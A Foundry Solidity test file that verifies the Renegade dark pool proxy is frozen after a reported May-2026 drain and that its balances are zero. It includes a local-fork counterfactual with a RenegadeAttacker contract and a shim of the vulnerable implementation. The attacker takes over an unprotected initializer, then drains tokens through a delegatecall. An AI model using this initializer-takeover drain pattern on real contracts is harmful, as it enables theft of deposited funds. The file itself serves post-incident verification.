// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// C-27 — Renegade V1 dark pool (Arbitrum proxy 0x30bD8eAb29181F790D7e495786d4B96d7AfDC518)
/// Live-state verification + synthetic pre-freeze counterfactual.
///
/// All tests are read-only against live chains: they run on local forks created from public RPCs.
/// The single "counterfactual" test mutates only the local fork state (vm.store/vm.etch) to
/// simulate the pre-freeze implementation and prove that the freeze is the gate that blocks the
/// original May-2026 exploit path today.
///
/// History (verified on-chain):
///  - 2024-09-03  proxy deployed (block 249,784,924), initial implementation 0x92b5f6dae...
///  - 2024-09..2025-01  eight Solidity implementation upgrades (last 0x113eb054...)
///  - 2025-04-08  migration to Stylus implementation 0x4b1d056d... (block 324,060,260)
///  - 2025-05-21  final Stylus implementation 0xc038933d... (block 339,138,251)
///  - 2026-05-10 07:27 UTC  exploit tx 0x0e494685... (block 461,301,926) drains 26 ERC-20s (~$209k)
///  - 2026-05-10 18:04 UTC  admin calls ProxyAdmin.upgradeAndCall -> DarkpoolFrozen 0x58f876aa...
///                          (block 461,440,223) — the proxy is bricked; every call reverts.
///
/// Live result: extractable by an unprivileged attacker = $0.

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IDarkpoolStylusLike {
    // Original Stylus-V1 initializer reached by the attacker (selector 0x92413afe)
    function initialize(
        address p0,
        address p1,
        address p2,
        address p3,
        address p4,
        address p5,
        address p6,
        address p7,
        address p8,
        address p9,
        uint256 protocolFee,
        uint256[2] calldata publicBlinder,
        address owner
    ) external;

    // Original wallet update (selector 0x803f430a); the implementation delegatecalls a
    // configured `transferExecutor` after verification.
    function updateWallet(bytes calldata, bytes calldata, bytes calldata, bytes calldata) external;
}

contract RenegadeArbTest is Test {
    address internal constant PROXY = 0x30bD8eAb29181F790D7e495786d4B96d7AfDC518;
    address internal constant FROZEN_IMPL = 0x58f876aAeeCBD5a0fca8F87e1313a9188C155bcC;
    address internal constant OLD_STYLUS_IMPL = 0xC038933d0b33359f5C87B4B2f92Ee0DAd11EaDc5;

    bytes32 internal constant IMPL_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    bytes4 internal constant FROZEN_ERR = 0x7be24541; // DarkpoolFrozenError()

    // The 26 tokens drained on 2026-05-10 (from the incident trace / DeFiHackLabs PoC).
    address[26] internal TOKENS = [
        0x0721b3C9f19cfeF1d622C918DcD431960f35E060, // SYNTH
        0x0c880f6761F1af8d9Aa9C466984b80DAb9a8c9e8, // PENDLE
        0x11cDb42B0EB46D95f990BeDD4695A6e3fA034978, // CRV
        0x13ad3f1150db0e1e05fd32bDEeB7C110ee023de6, // DeFAI
        0x13Ad51ed4F1B7e9Dc168d8a00cB3f4dDD85EfA60, // LDO
        0x289ba1701C2F088cf0faf8B3705246331cB8A839, // LPT
        0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f, // WBTC
        0x306fD3e7b169Aa4ee19412323e1a5995B8c1a1f4, // FTW
        0x3082CC23568eA640225c2467653dB90e9250AaA0, // RDNT
        0x354A6dA3fcde098F8389cad84b0182725c6C91dE, // COMP
        0x45D9831d8751B2325f3DBf48db748723726e1C8c, // EVA
        0x4Cb9a7AE498CEDcBb5EAe9f25736aE7d428C9D66, // XAI
        0x65C101E95D7DD475c7966330fa1A803205FF92aB, // HOL
        0x6985884C4392D348587B19cb9eAAf157F13271cd, // ZRO
        0x7189fb5B6504bbfF6a852B13B7B82a3c118fDc27, // ETHFI
        0x82aF49447D8a07e3bd95BD0d56f35241523fBab1, // WETH
        0x912CE59144191C1204E64559FE8253a0e49E6548, // ARB
        0x9623063377AD1B27544C965cCd7342f7EA7e88C7, // GRT
        0xaf88d065e77c8cC2239327C5EDb3A432268e5831, // USDC
        0xb1425d5Bafc89A069421F69Ba57DBE2F23fC45f6, // BKC
        0xba5DdD1f9d7F570dc94a51479a000E3BCE967196, // AAVE
        0xC5a861787f3e173F2b004d5cfA6a717f5DC5484D, // SNL
        0xf97f4df75117a78c1A5a0DBb814Af92458539FB4, // LINK
        0xFa7F8980b0f1E64A2062791cc3b0871572f1F7f0, // UNI
        0xfc5A1A6EB076a2C7aD06eD22C90d7E710E35ad0a, // GMX
        0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9  // USDT0
    ];

    uint256 internal forkBlock;

    function setUp() public {
        vm.createSelectFork(vm.envOr("ARB_RPC_URL", string("https://arb1.arbitrum.io/rpc")));
        forkBlock = block.number;
    }

    /// 1. The live implementation is the DarkpoolFrozen brick.
    function test_01_live_impl_is_darkpool_frozen() public {
        bytes32 slot = vm.load(PROXY, IMPL_SLOT);
        address impl = address(uint160(uint256(slot)));
        assertEq(impl, FROZEN_IMPL, "live impl is not the frozen impl");
        assertGt(impl.code.length, 0, "frozen impl has no code");
        assertEq(impl.codehash, 0x1eab163f1f897929be0389a77f1f4b52a3aa3dd2b328f6f0abf3f55f1944e315);
        console.log("live block", forkBlock);
        console.log("live impl", impl);
    }

    /// 2. The exact original exploit entrypoints now revert with DarkpoolFrozenError.
    function test_02_original_exploit_entrypoints_revert() public {
        address attacker = address(0xA11CE);
        uint256[2] memory blinder;

        // exact original Stylus initializer selector 0x92413afe, attacker-controlled args
        bytes memory initData = abi.encodeWithSelector(
            bytes4(0x92413afe),
            attacker,
            attacker,
            attacker,
            attacker,
            attacker,
            attacker,
            attacker,
            attacker,
            attacker,
            attacker,
            uint256(0),
            blinder,
            attacker
        );
        (bool ok, bytes memory ret) = PROXY.call(initData);
        assertFalse(ok, "initialize must revert");
        assertTrue(bytes4(ret) == FROZEN_ERR, "initialize revert is not DarkpoolFrozenError");
        console.log("initialize(0x92413afe) revert selector:");
        console.logBytes4(bytes4(ret));

        // original updateWallet selector 0x803f430a
        (ok, ret) = PROXY.call(
            abi.encodeWithSelector(bytes4(0x803f430a), bytes(""), bytes(""), bytes(""), bytes(""))
        );
        assertFalse(ok, "updateWallet must revert");
        assertTrue(bytes4(ret) == FROZEN_ERR, "updateWallet revert is not DarkpoolFrozenError");

        // generic getters also revert through the frozen fallback
        (ok, ret) = PROXY.call(abi.encodeWithSignature("owner()"));
        assertFalse(ok, "owner() must revert");
        assertTrue(bytes4(ret) == FROZEN_ERR);

        // and the proxy cannot receive ETH
        (ok,) = PROXY.call{value: 1 ether}("");
        assertFalse(ok, "proxy must reject ETH");
    }

    /// 3. Live balances: zero for all 26 originally drained tokens + native ETH, and zero on
    ///    every historical implementation account. Residual "value" in the proxy is 87
    ///    unpriced spam airdrops, all immovable because the proxy has no callable logic.
    function test_03_live_balances_are_zero() public {
        assertEq(PROXY.balance, 0, "proxy ETH not zero");
        for (uint256 i = 0; i < TOKENS.length; i++) {
            uint256 bal = IERC20(TOKENS[i]).balanceOf(PROXY);
            assertEq(bal, 0, "proxy token balance non-zero");
        }
        address[4] memory impls = [FROZEN_IMPL, OLD_STYLUS_IMPL, 0x4b1D056d4d47b891B9373A931e7Ee1f398762E69, 0x113eb054CA1FC42124B4DB004528Ce1857b721bB];
        for (uint256 j = 0; j < impls.length; j++) {
            assertEq(impls[j].balance, 0, "impl ETH non-zero");
            for (uint256 i = 0; i < TOKENS.length; i++) {
                assertEq(IERC20(TOKENS[i]).balanceOf(impls[j]), 0, "impl token balance non-zero");
            }
        }
    }

    /// 4. Counterfactual: the ONLY difference between "closed" and "open" is the frozen
    ///    implementation. Re-pointing the proxy at a vulnerable implementation profile on the
    ///    fork (vm.store + vm.etch, local-only) lets the original initialize -> updateWallet
    ///    delegatecall path drain tokens again. This is a negative-control proof that the
    ///    freeze — not luck — is what blocks the attacker today.
    function test_04_counterfactual_unfreeze_path_reopens_drain() public {
        // sanity: live proxy currently rejects the attack
        (bool okLive,) = PROXY.call(abi.encodeWithSignature("owner()"));
        assertFalse(okLive, "proxy unexpectedly callable");

        // --- local fork only: simulate pre-freeze implementation profile ---
        vm.store(PROXY, IMPL_SLOT, bytes32(uint256(uint160(OLD_STYLUS_IMPL))));
        RenegadeStylusShim shim = new RenegadeStylusShim();
        vm.etch(OLD_STYLUS_IMPL, address(shim).code);

        // seed the proxy with the kind of deposits it custodied pre-exploit.
        // Use impersonated whale transfers (no storage-slot heuristics, works for proxy tokens):
        // Aave V3 aTokens hold the underlying assets on Arbitrum.
        _seed(0x724dc807b04555b71ed48a6896b6F41593b8C637, TOKENS[18], 100_000e6); // aArbUSDC
        _seed(0xe50fA9b3c56FfB159cB0FCA61F5c9D750e8128c8, TOKENS[15], 10e18); // aArbWETH
        _seed(0x078f358208685046a11C85e8ad32895DED33A249, TOKENS[6], 1e8); // aArbWBTC
        assertEq(IERC20(TOKENS[18]).balanceOf(PROXY), 100_000e6);

        RenegadeAttacker atk = new RenegadeAttacker();
        uint256 usdcBefore = IERC20(TOKENS[18]).balanceOf(atk.BENEFICIARY());
        atk.attack(PROXY, address(atk));

        assertEq(IERC20(TOKENS[18]).balanceOf(PROXY), 0, "USDC not drained in counterfactual");
        assertEq(IERC20(TOKENS[15]).balanceOf(PROXY), 0, "WETH not drained in counterfactual");
        assertEq(IERC20(TOKENS[6]).balanceOf(PROXY), 0, "WBTC not drained in counterfactual");
        assertEq(
            IERC20(TOKENS[18]).balanceOf(atk.BENEFICIARY()) - usdcBefore,
            100_000e6,
            "beneficiary did not receive drained USDC"
        );
        console.log("counterfactual drain OK - freeze is the gate");
    }

    /// Seed fork balances by impersonating a whale holder (local fork state only).
    function _seed(address whale, address token, uint256 amount) internal {
        uint256 bal = IERC20(token).balanceOf(whale);
        require(bal >= amount, "whale has insufficient balance");
        vm.prank(whale);
        IERC20(token).transfer(PROXY, amount);
    }
}

/// Minimal re-implementation of the vulnerable Stylus implementation surface used by the
/// May-2026 exploit: `initialize` accepts an attacker-chosen executor address and
/// `updateWallet` delegatecalls a configured executor. Foundry/revm cannot execute Arbitrum
/// Stylus WASM, so this shim is etched over the old implementation in the fork test only.
contract RenegadeStylusShim {
    bytes4 internal constant INIT_SELECTOR = 0x92413afe;
    bytes4 internal constant UPDATE_WALLET_SELECTOR = 0x803f430a;
    address internal injectedLogic;

    fallback() external {
        require(
            msg.sig == INIT_SELECTOR || msg.sig == UPDATE_WALLET_SELECTOR,
            "unexpected selector"
        );
        if (msg.sig == INIT_SELECTOR) {
            injectedLogic = abi.decode(msg.data[4:], (address));
            return;
        }
        address logic = injectedLogic;
        require(logic != address(0), "no injected logic");
        (bool ok,) = logic.delegatecall(
            abi.encodeWithSelector(RenegadeAttacker.drainTokens.selector)
        );
        require(ok, "injected delegatecall failed");
    }
}

contract RenegadeAttacker {
    address internal constant PROXY = 0x30bD8eAb29181F790D7e495786d4B96d7AfDC518;
    address payable public constant BENEFICIARY = payable(address(0xBEEF));

    address internal constant USDC = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831;
    address internal constant WETH = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
    address internal constant WBTC = 0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f;

    function attack(address proxy, address injectedLogic) external {
        uint256[2] memory blinder;
        IDarkpoolStylusLike(proxy).initialize(
            injectedLogic,
            address(0),
            address(0),
            address(0),
            address(0),
            address(0),
            address(0),
            address(0),
            address(0),
            address(0),
            0,
            blinder,
            address(this)
        );
        IDarkpoolStylusLike(proxy).updateWallet("", "", "", "");
    }

    /// Executed via delegatecall from the proxy context (shim), so `address(this)` is the proxy.
    /// The token list is kept in code (memory), never in storage: under delegatecall, storage
    /// reads would resolve against the proxy's slots.
    function drainTokens() external {
        address[3] memory toks = [USDC, WETH, WBTC];
        for (uint256 i = 0; i < toks.length; i++) {
            uint256 bal = IERC20(toks[i]).balanceOf(address(this));
            if (bal != 0) {
                IERC20(toks[i]).transfer(BENEFICIARY, bal);
            }
        }
    }
}

contract RenegadeBaseTest is Test {
    address internal constant BASE_DARKPOOL = 0xb4a96068577141749CC8859f586fE29016C935dB;
    bytes32 internal constant IMPL_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    bytes32 internal constant OZ_V5_INIT_SLOT =
        0xf0c57e16840df040f15088dc2f81fe391c3923bec73e23a9662efc9c229c6a00;



    uint256 internal forkBlock;

    function setUp() public {
        vm.createSelectFork(vm.envOr("BASE_RPC_URL", string("https://mainnet.base.org")));
        forkBlock = block.number;
    }

    /// The Base dark pool (same address, different chain) is a live Solidity V1 deployment.
    /// Its OZ v5 initializer slot == 1, so the unprotected-initializer path is closed.
    function test_base_initializer_is_consumed() public {
        assertGt(BASE_DARKPOOL.code.length, 0, "no code on Base darkpool");
        bytes32 ozSlot = vm.load(BASE_DARKPOOL, OZ_V5_INIT_SLOT);
        assertEq(uint256(ozSlot), 1, "OZ initializable slot != 1");

        // live getters work (not frozen)
        (bool ok, bytes memory ret) = BASE_DARKPOOL.staticcall(abi.encodeWithSignature("paused()"));
        assertTrue(ok, "paused() failed");
        assertEq(abi.decode(ret, (bool)), false, "Base darkpool paused");

        // re-initialization reverts. The deployed Base implementation uses initializer selector
        // 0xacad1e2c = initialize(address,uint256,address,((uint256,uint256)),address,address,
        // address,address,address) — an older V1 build than the current repo's Darkpool.sol.
        bytes memory data = abi.encodePacked(
            bytes4(0xacad1e2c),
            uint256(uint160(address(0xBAD))), // initialOwner
            uint256(0), // protocolFeeRate
            uint256(uint160(address(0xBAD))), // protocolFeeRecipient
            uint256(0), // protocolFeeKey.x
            uint256(0), // protocolFeeKey.y
            uint256(uint160(0x4200000000000000000000000000000000000006)), // weth
            uint256(uint160(0x5dd0E86d2c4Eb7617103a52779d1D362f5Bd853e)), // hasher
            uint256(uint160(address(0xBAD))), // verifier
            uint256(uint160(0x000000000022D473030F116dDEE9F6B43aC78BA3)), // permit2
            uint256(uint160(address(0xBAD))) // transferExecutor
        );
        (ok, ret) = BASE_DARKPOOL.call(data);
        assertFalse(ok, "Base initialize must revert");
        console.log("Base initialize(0xacad1e2c) revert data:");
        console.logBytes(ret);
        assertTrue(bytes4(ret) == 0xf92ee8a9, "expected InvalidInitialization()");

        console.log("base block", forkBlock);
    }

    /// Base dark pool holds no priced assets (only unpriced spam airdrops).
    function test_base_balances() public {
        assertEq(
            IERC20(0x4200000000000000000000000000000000000006).balanceOf(BASE_DARKPOOL),
            0,
            "WETH"
        );
        assertEq(
            IERC20(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913).balanceOf(BASE_DARKPOOL),
            0,
            "USDC"
        );
        assertEq(BASE_DARKPOOL.balance, 0, "ETH");
    }
}
